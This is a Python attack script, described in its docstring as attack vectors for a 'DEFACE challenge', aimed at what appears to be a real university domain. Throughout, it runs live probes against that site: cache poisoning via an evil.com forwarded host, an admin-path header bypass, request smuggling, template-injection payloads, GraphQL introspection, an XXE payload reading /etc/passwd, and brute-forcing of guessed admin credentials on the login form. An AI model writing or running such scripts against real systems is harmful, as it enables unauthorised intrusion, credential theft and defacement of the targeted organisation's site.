#!/usr/bin/env python3
"""
Advanced attack vectors for DEFACE challenge
"""
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "https://www.esic.edu"
TIMEOUT = 15

def test_cache_poisoning():
    """Test cache poisoning to inject malicious content"""
    print("[*] Testing cache poisoning...")
    
    # X-Forwarded-Host poisoning
    headers = {"X-Forwarded-Host": "evil.com"}
    r = requests.get(TARGET, headers=headers, timeout=TIMEOUT, verify=False)
    if "evil.com" in r.text:
        print("[!] Possible cache poisoning via X-Forwarded-Host!")
        return True
    
    # X-Original-URL
    r = requests.get(TARGET, headers={"X-Original-URL": "/admin"}, timeout=TIMEOUT, verify=False)
    if r.status_code != 404:
        print(f"[!] X-Original-URL bypass: {r.status_code}")
    
    return False

def test_http_smuggling():
    """Test HTTP request smuggling"""
    print("[*] Testing HTTP request smuggling...")
    
    # CL.TE smuggling attempt
    smuggled_request = (
        "GET /admin HTTP/1.1\r\n"
        "Host: www.esic.edu\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "test"
    )
    
    try:
        # This is a simplified test - real smuggling is more complex
        r = requests.post(TARGET, data=smuggled_request, timeout=TIMEOUT, verify=False)
        print(f"[+] Smuggling test: {r.status_code}")
    except:
        pass
    
    return False

def test_ssti():
    """Test for Server Side Template Injection"""
    print("[*] Testing SSTI...")
    
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "{{config}}",
        "{{self}}",
    ]
    
    # Test in various parameters
    for payload in payloads:
        try:
            # In query params
            r = requests.get(f"{TARGET}?test={payload}", timeout=TIMEOUT, verify=False)
            if "49" in r.text:
                print(f"[!] Possible SSTI with payload: {payload}")
                return True
        except:
            pass
    
    return False

def test_graphql():
    """Test for GraphQL endpoint"""
    print("[*] Testing for GraphQL...")
    
    endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
    
    for endpoint in endpoints:
        try:
            # Introspection query
            query = {"query": "{__schema{types{name}}}"}
            r = requests.post(f"{TARGET}{endpoint}", json=query, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and "data" in r.text:
                print(f"[!] GraphQL found at: {endpoint}")
                print(f"    Response: {r.text[:200]}")
                return True
        except:
            pass
    
    return False

def test_xxe():
    """Test for XXE vulnerabilities"""
    print("[*] Testing XXE...")
    
    xxe_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>"""
    
    try:
        r = requests.post(f"{TARGET}/api/Script/change_program_campus", 
                         data=xxe_payload, 
                         headers={"Content-Type": "application/xml"},
                         timeout=TIMEOUT, verify=False)
        if "root:" in r.text:
            print("[!] XXE VULNERABILITY FOUND!")
            print(r.text[:500])
            return True
    except:
        pass
    
    return False

def bruteforce_admin():
    """Smart admin credential bruteforce"""
    print("[*] Testing admin credentials...")
    
    # Common ESIC-specific credentials
    credentials = [
        ("admin", "esic2024"),
        ("admin", "esic2025"),
        ("admin@esic.edu", "esic2024"),
        ("administrator", "Admin123"),
        ("esic", "esic"),
        ("webmaster@esic.edu", "Welcome123"),
    ]
    
    login_url = f"{TARGET}/user/login"
    
    for username, password in credentials:
        try:
            # Get form_build_id first
            r = requests.get(login_url, timeout=TIMEOUT, verify=False)
            import re
            form_id = re.findall(r'name="form_build_id" value="([^"]+)"', r.text)
            if not form_id:
                continue
            
            data = {
                "name": username,
                "pass": password,
                "form_build_id": form_id[0],
                "form_id": "user_login_form",
                "op": "Iniciar sesión"
            }
            
            r = requests.post(login_url, data=data, timeout=TIMEOUT, verify=False, allow_redirects=False)
            if r.status_code == 302 or "logout" in r.text.lower():
                print(f"[!] VALID CREDENTIALS: {username}:{password}")
                return True
        except:
            pass
    
    return False

if __name__ == "__main__":
    print("[*] Running advanced attack tests...")
    
    test_cache_poisoning()
    test_http_smuggling()
    test_ssti()
    test_graphql()
    test_xxe()
    bruteforce_admin()
    
    print("\n[*] Advanced tests completed.")
